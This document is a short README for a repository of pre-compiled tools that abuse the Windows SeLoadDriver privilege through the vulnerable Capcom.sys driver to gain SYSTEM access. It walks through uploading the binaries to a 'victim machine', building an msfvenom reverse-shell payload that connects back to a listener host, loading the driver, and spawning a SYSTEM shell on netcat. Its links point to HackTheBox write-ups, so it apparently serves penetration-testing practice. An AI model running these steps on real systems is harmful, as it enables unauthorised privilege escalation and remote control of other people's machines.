# SeLoadDriverAbuse

Pre-compiled binaries to exploit SeLoadDriver privilege using Capcom.sys driver for privilege escalation in x64 based Windows Systems.

Upload the two binaries along with the Capcom.sys driver to the victim machine.

The ExploitCapcom binary is hardcoded to execute a binary named `shell.exe` from `C:\Windows\Tasks`.

Generate a reverse shell payload using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o shell.exe
```

Copy over the shell.exe revershell payload to `C:\Windows\Tasks`.

Load the driver:

```cmd
.\EoPLoadDriver.exe System\CurrentControlSet\dfserv C:\Windows\Tasks\Capcom.sys
```

Now run the exploit with nc listener:

```cmd
.\ExploitCapcom
```

The binary will execute shell.exe with administrative privileges and a shell with will be spawned on the netcat listener as `nt authority\system`.




---------------------------------------

Resources:

https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/

https://github.com/tandasat/ExploitCapcom

https://github.com/TarlogicSecurity/EoPLoadDriver/

https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

https://0xdf.gitlab.io/2020/10/31/htb-fuse.html

https://youtu.be/VxbC03xmS60 (Ippsec HTB-Fuse).
